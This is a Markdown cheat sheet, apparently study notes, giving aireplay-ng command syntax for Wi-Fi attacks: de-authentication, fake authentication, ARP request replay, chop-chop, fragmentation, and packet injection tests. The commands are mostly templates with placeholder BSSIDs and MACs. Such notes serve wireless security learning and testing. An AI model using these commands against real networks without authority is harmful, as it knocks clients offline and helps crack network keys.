Use to generate wireless traffic, as well as packet replays, de-auth attack, Chop-Chop attack, etc. See [aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)for the detailed documentation.

> Only 0 & 9 are most relevant to WPA attacks. Others are all for WEP.

### Syntax for Selected Attacks
---
##### 0. De-authentication Attack
###### De-auth Attacks:
```sh
sudo aireplay-ng -0 <number> -a <AP bssid> -c <Target Client bssid> wlan0mon
```
- `--deauth` or `-0` for specifying de-auth attack. The number following the option indicates the number of de-auth packets to be sent.
	- E.g., For `--deauth 70`, the network will be disconnected for 70 seconds.
- `-c` for specifying a client device. If not specified, then all devices will be disconnected.

##### 1. Fake Authentication Attack
###### Fake authentication Attack:
Some attacks required an associated MAC address of a client. If no clients are connected to the AP, we would need to associate with the AP ourself to perform packet injection.

To associate our MAC to the AP, we can perform a fake-auth attack:
```sh
sudo aireplay-ng -1 <number> -q 10 -a <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- `--fakeauth` or `-1` for specifying fake-auth attack. The number following the option indicates the number of fake-auth packets to be sent.
- `-q` to specify seconds between sending keep-alives (-1) messages.

##### 3. ARP Request Replay Attack
###### ARP-request replay Attack:
This will generate a huge amount of ARP packets for cracking.
``` sh
sudo aireplay-ng -3 -b [AP bssid] -h [Target Client MAC] wlan0mon
```
- Requires the MAC address of a connected client.

##### 4. KoreK ChopChop Attack
###### Chop chop Attack:
```sh
sudo aireplay-ng -4 -b <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- Respond with `Y` when an ARP packet is found to use the packet.
- This will generate a XOR file (Decipher key) from the packet.

##### 5. Fragmentation Attack
###### Fragmentation Attack:
```sh
sudo aireplay-ng -5 -b <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- Aternative of Chop chop attack
- Always respond with `Y`.
- This will generate a XOR file (Decipher key) from the packet.

##### 9. Injection Test

###### Basic Injection Test (Single Card Injection):
```sh
sudo aireplay-ng wlan0mon -9
```
- To test if we can successfully inject packets into the AP.

To specify ESSID & BSSID:
```sh
sudo aireplay-ng wlan0mon -9 -e <AP essid> -a <AP bssid>
```
- Add `-D` to disable AP detection.

###### Card-to-Card Injection Test:
(Requires 2 wireless card in monitor mode.)
```sh
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```
- This is a more robust injection test that can confirm our injecting frames are correctly sent.
- This will also show us what attacks can be performed.
